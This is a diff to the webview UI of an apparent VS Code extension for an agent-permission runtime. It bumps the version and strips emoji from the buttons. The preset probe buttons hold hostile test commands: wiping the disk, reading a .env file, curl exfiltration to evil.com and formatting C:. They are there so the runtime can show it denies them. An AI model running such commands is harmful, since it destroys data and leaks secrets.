@@ -601,7 +601,7 @@ export function activate(context: ExtensionContext) {
       line-height: 1.5;
     }
     .b-list li::before {
-      content: "❯";
+      content: "•";
       position: absolute;
       left: 2px;
       color: var(--cyan-bright);
@@ -825,7 +825,7 @@ export function activate(context: ExtensionContext) {
         </svg>
       </div>
       <div>
-        <div class="brand-title">BARTHOLOMEW KEYSTONE &bull; CAPABILITY PASSKEY <span class="brand-version">v6.4.0</span></div>
+        <div class="brand-title">BARTHOLOMEW KEYSTONE &bull; CAPABILITY PASSKEY <span class="brand-version">v6.4.1</span></div>
         <div class="brand-sub">ZERO TRUST AGENT RUNTIME &bull; SUB-15&mu;s DETERMINISTIC INVARIANTS</div>
       </div>
     </div>
@@ -897,18 +897,18 @@ export function activate(context: ExtensionContext) {
     <div class="b-title" style="color: var(--cyan-bright);">[INTERACTIVE CLEARANCE PROBE] TEST ANY COMMAND OR TARGET</div>
     <div style="font-size: 11.5px; color: var(--text-muted); margin-bottom: 8px;">Click a preset or enter a custom target to test against signed capability bounds:</div>
     <div class="preset-chips">
-      <button class="preset-btn" onclick="setAndTest('rm -rf /')">&#128165; rm -rf /</button>
-      <button class="preset-btn" onclick="setAndTest('cat .env')">&#128273; cat .env</button>
-      <button class="preset-btn" onclick="setAndTest('curl https://evil.com/exfil')">&#127760; curl exfil</button>
-      <button class="preset-btn" onclick="setAndTest('npm test')">&#10003; npm test</button>
-      <button class="preset-btn" onclick="setAndTest('format C: /q /y')">&#128721; format C:</button>
+      <button class="preset-btn" onclick="setAndTest('rm -rf /')">rm -rf /</button>
+      <button class="preset-btn" onclick="setAndTest('cat .env')">cat .env</button>
+      <button class="preset-btn" onclick="setAndTest('curl https://evil.com/exfil')">curl exfil</button>
+      <button class="preset-btn" onclick="setAndTest('npm test')">npm test</button>
+      <button class="preset-btn" onclick="setAndTest('format C: /q /y')">format C:</button>
     </div>
     <input type="text" id="action-input" class="test-input" placeholder="Enter command or target (e.g. 'rm -rf /' or 'src/index.ts')..." value="rm -rf /" />
     <div class="btn-row">
-      <button class="btn btn-primary" onclick="testAction()">&#9889; EVALUATE CLEARANCE</button>
-      <button class="btn btn-secondary" onclick="runCmd('keystone.issuePasskey')">&#128273; ISSUE NEW PASSKEY</button>
-      <button class="btn btn-secondary" onclick="runCmd('keystone.auditReceipts')">&#128220; VIEW AUDIT RECEIPTS</button>
-      <button class="btn btn-secondary" onclick="runCmd('keystone.revokePasskey')">&#128721; REVOKE PASSKEY</button>
+      <button class="btn btn-primary" onclick="testAction()">EVALUATE CLEARANCE</button>
+      <button class="btn btn-secondary" onclick="runCmd('keystone.issuePasskey')">ISSUE NEW PASSKEY</button>
+      <button class="btn btn-secondary" onclick="runCmd('keystone.auditReceipts')">VIEW AUDIT RECEIPTS</button>
+      <button class="btn btn-secondary" onclick="runCmd('keystone.revokePasskey')">REVOKE PASSKEY</button>
     </div>
     <div id="term-out" class="terminal">
       [READY] Select an action above or type a command to verify deterministic evaluation in &lt;15&mu;s.
